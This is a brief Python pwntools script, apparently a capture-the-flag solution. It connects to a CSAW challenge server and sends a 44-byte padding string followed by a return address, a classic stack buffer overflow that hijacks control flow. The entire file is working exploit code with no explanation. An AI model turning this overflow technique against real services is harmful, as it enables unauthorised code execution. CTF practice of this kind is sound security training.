
from pwn import *

io = remote("pwn.red.csaw.io", 5001)
print(io.recv())
io.sendline("A"*44 + "\x86\x85\x04\x08")

print(io.recv())



